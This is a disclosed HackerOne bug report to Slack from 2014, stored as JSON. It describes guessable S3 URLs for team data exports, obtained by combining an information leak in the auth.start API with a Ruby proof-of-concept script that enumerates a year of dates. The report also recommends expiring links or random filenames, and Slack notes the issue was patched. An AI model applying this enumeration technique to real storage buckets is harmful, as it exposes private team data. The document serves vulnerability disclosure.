{"id":2746,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzQ2","url":"https://hackerone.com/reports/2746","title":"Data exports stored on S3 can be scraped easily","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-03-02T20:57:39.781Z","submitted_at":"2014-03-02T20:57:39.781Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":69,"url":"https://hackerone.com/slack","handle":"slack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Slack","twitter_handle":"slackhq","website":"https://slack.com","about":"All your team communication in one place, instantly searchable, and available wherever you go."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-12-09T20:34:59.860Z","bug_reporter_agreed_on_going_public_at":"2014-11-09T20:34:55.833Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The URLs that are used to download the exports can be guessed easily by an attacker. The location of the export file is based on a date, a team ID and a team name:\r\n\r\n```\r\nhttp://s3-us-west-2.amazonaws.com/slack-files2/\u003cteam_id\u003e/export/\u003cdate\u003e/\u003cname\u003e%20Slack%20export%20\u003cdate\u003e.zip\r\n```\r\n\r\nThe information an attacker needs, is the team its name and ID (the date needs to be enumerated). The information can be obtained due to a minor issue in the API (authentication). The following steps can be used to reproduce the issue.\r\n\r\n#Step 1: obtain team ID and team name\r\nThe team ID and team name can be obtained by abusing some minor information leakage in the `auth.start` API call. The following request and response give an example.\r\n\r\n**Request**\r\n\r\n```\r\nPOST /api/auth.start HTTP/1.1\r\n...\r\n\r\nemail=jobert@hackerone.com\r\n```\r\n\r\n**Response**\r\n\r\n```\r\nHTTP/1.1 200 OK\r\n...\r\n\r\n{\"ok\":true,\"email\":\"jobert@hackerone.com\",\"domain\":\"hackerone.com\",\"users\":[{\"url\":\"https:\\/\\/hackerone.slack.com\\/\",\"team\":\"HackerOne\",\"user\":\"jobert\",\"team_id\":\"T0254389F\",\"user_id\":\"U0254GYNR\"}],\"teams\":[],\"create\":\"https:\\/\\/slack.com\\/create?email=jobert%40hackerone.com\"}\r\n```\r\n\r\nAs can be seen in the JSON response, it contains the team ID (`T0254389F`) and a name (`HackerOne`) we need for the download links.\r\n\r\n#Step 2: scrape S3\r\nI wrote a rough PoC that scrapes S3 and shows the found exports (not something I'd use, just something I wrote for demonstration purposes -- feel free to use the team ID and name I mentioned before to check it out). \r\n\r\n``` ruby\r\nrequire 'date'\r\nrequire 'net/http'\r\nrequire 'uri'\r\n\r\nteam_id = ARGV[0]\r\nteam_name = ARGV[1]\r\n\r\ndef create_export_url(team_id, team_name, date)\r\n  date_dir  = date.strftime '%Y-%m-%d'\r\n  date_file = date.strftime('%b %-d %Y').gsub ' ', '%20'\r\n\r\n  \"http://s3-us-west-2.amazonaws.com/slack-files2/#{team_id}/\"\\\r\n  \"export/#{date_dir}/#{team_name}%20Slack%20export%20#{date_file}.zip\"\r\nend\r\n\r\ndate = Date.parse 'March 2nd, 2014'\r\n\r\n365.times do\r\n  uri      = URI create_export_url(team_id, team_name, date)\r\n  response = Net::HTTP.get_response uri\r\n\r\n  if response.is_a? Net::HTTPOK\r\n    puts \"FOUND AN EXPORT: #{uri}\"\r\n  end\r\n\r\n  date -= 1\r\nend\r\n```\r\n\r\nTo avoid these kind of issues, you could generate a link that [expires within a certain amount](http://css-tricks.com/snippets/php/generate-expiring-amazon-s3-link/) of time (let's say, `\u003ctime-export-completed\u003e+30m`) or use random values in the filename if expiring is not an option (make sure you don't solely rely on \"public domain info\").","vulnerability_information_html":"\u003cp\u003eThe URLs that are used to download the exports can be guessed easily by an attacker. The location of the export file is based on a date, a team ID and a team name:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://s3-us-west-2.amazonaws.com/slack-files2/\u0026lt;team_id\u0026gt;/export/\u0026lt;date\u0026gt;/\u0026lt;name\u0026gt;%20Slack%20export%20\u0026lt;date\u0026gt;.zip\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe information an attacker needs, is the team its name and ID (the date needs to be enumerated). The information can be obtained due to a minor issue in the API (authentication). The following steps can be used to reproduce the issue.\u003c/p\u003e\n\n\u003ch1 id=\"step-1-obtain-team-id-and-team-name\"\u003eStep 1: obtain team ID and team name\u003c/h1\u003e\n\n\u003cp\u003eThe team ID and team name can be obtained by abusing some minor information leakage in the \u003ccode\u003eauth.start\u003c/code\u003e API call. The following request and response give an example.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /api/auth.start HTTP/1.1\n...\n\nemail=jobert@hackerone.com\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eResponse\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\n...\n\n{\u0026quot;ok\u0026quot;:true,\u0026quot;email\u0026quot;:\u0026quot;jobert@hackerone.com\u0026quot;,\u0026quot;domain\u0026quot;:\u0026quot;hackerone.com\u0026quot;,\u0026quot;users\u0026quot;:[{\u0026quot;url\u0026quot;:\u0026quot;https:\\/\\/hackerone.slack.com\\/\u0026quot;,\u0026quot;team\u0026quot;:\u0026quot;HackerOne\u0026quot;,\u0026quot;user\u0026quot;:\u0026quot;jobert\u0026quot;,\u0026quot;team_id\u0026quot;:\u0026quot;T0254389F\u0026quot;,\u0026quot;user_id\u0026quot;:\u0026quot;U0254GYNR\u0026quot;}],\u0026quot;teams\u0026quot;:[],\u0026quot;create\u0026quot;:\u0026quot;https:\\/\\/slack.com\\/create?email=jobert%40hackerone.com\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs can be seen in the JSON response, it contains the team ID (\u003ccode\u003eT0254389F\u003c/code\u003e) and a name (\u003ccode\u003eHackerOne\u003c/code\u003e) we need for the download links.\u003c/p\u003e\n\n\u003ch1 id=\"step-2-scrape-s3\"\u003eStep 2: scrape S3\u003c/h1\u003e\n\n\u003cp\u003eI wrote a rough PoC that scrapes S3 and shows the found exports (not something I\u0026#39;d use, just something I wrote for demonstration purposes -- feel free to use the team ID and name I mentioned before to check it out). \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;date\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;net/http\u0026#39;\u003c/span\u003e\n\u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;uri\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eteam_id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eARGV\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"n\"\u003eteam_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eARGV\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ecreate_export_url\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eteam_id\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eteam_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003edate_dir\u003c/span\u003e  \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estrftime\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;%Y-%m-%d\u0026#39;\u003c/span\u003e\n  \u003cspan class=\"n\"\u003edate_file\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;%b %-d %Y\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003egsub\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;%20\u0026#39;\u003c/span\u003e\n\n  \u003cspan class=\"s2\"\u003e\u0026quot;http://s3-us-west-2.amazonaws.com/slack-files2/\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003eteam_id\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e\\\u003c/span\u003e\n  \u003cspan class=\"s2\"\u003e\u0026quot;export/\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003edate_dir\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003eteam_name\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e%20Slack%20export%20\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003edate_file\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.zip\u0026quot;\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003edate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eDate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eparse\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;March 2nd, 2014\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"mi\"\u003e365\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003etimes\u003c/span\u003e \u003cspan class=\"k\"\u003edo\u003c/span\u003e\n  \u003cspan class=\"n\"\u003euri\u003c/span\u003e      \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eURI\u003c/span\u003e \u003cspan class=\"n\"\u003ecreate_export_url\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eteam_id\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eteam_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edate\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n  \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eNet\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eget_response\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eis_a?\u003c/span\u003e \u003cspan class=\"no\"\u003eNet\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eHTTPOK\u003c/span\u003e\n    \u003cspan class=\"nb\"\u003eputs\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;FOUND AN EXPORT: \u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003edate\u003c/span\u003e \u003cspan class=\"o\"\u003e-=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo avoid these kind of issues, you could generate a link that \u003ca href=\"/redirect?url=http%3A%2F%2Fcss-tricks.com%2Fsnippets%2Fphp%2Fgenerate-expiring-amazon-s3-link%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eexpires within a certain amount\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e of time (let\u0026#39;s say, \u003ccode\u003e\u0026lt;time-export-completed\u0026gt;+30m\u003c/code\u003e) or use random values in the filename if expiring is not an option (make sure you don\u0026#39;t solely rely on \u0026quot;public domain info\u0026quot;).\u003c/p\u003e\n","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-12-09T20:34:56.617Z","allow_singular_disclosure_after":-191061933.7437612,"singular_disclosure_allowed":true,"vote_count":7,"voters":["sw33tlie","sameerphad72","mygf","eveeez","spetr0x","cryptosector","felipera"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":11263,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report. Unfortunately, this issue had already been submitted. Our bug bounty program only awards the first report of any individual issue.\n\nI'm keeping this issue open until a fix is deployed.","markdown_message":"\u003cp\u003eThanks for your report. Unfortunately, this issue had already been submitted. Our bug bounty program only awards the first report of any individual issue.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m keeping this issue open until a fix is deployed.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-03-02T21:11:40.029Z","updated_at":"2014-03-02T21:11:40.029Z","actor":{"username":"iamcal","cleared":false,"url":"/iamcal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/138/0e164dd6477c48d57f2f5a1c56756f7ec98229cf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16204,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This issue was patched on 2014-03-02","markdown_message":"\u003cp\u003eThis issue was patched on 2014-03-02\u003c/p\u003e\n","automated_response":false,"created_at":"2014-03-12T23:12:26.492Z","updated_at":"2014-03-12T23:12:26.492Z","actor":{"username":"iamcal","cleared":false,"url":"/iamcal","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/138/0e164dd6477c48d57f2f5a1c56756f7ec98229cf_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":16205,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2014-03-12T23:12:31.132Z","updated_at":"2014-03-12T23:12:31.132Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Slack"}},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":157688,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-11-09T20:34:55.850Z","updated_at":"2014-11-09T20:34:55.850Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":175119,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-12-09T20:34:59.886Z","updated_at":"2014-12-09T20:34:59.886Z","actor":{"url":"/slack","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Slack"}},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}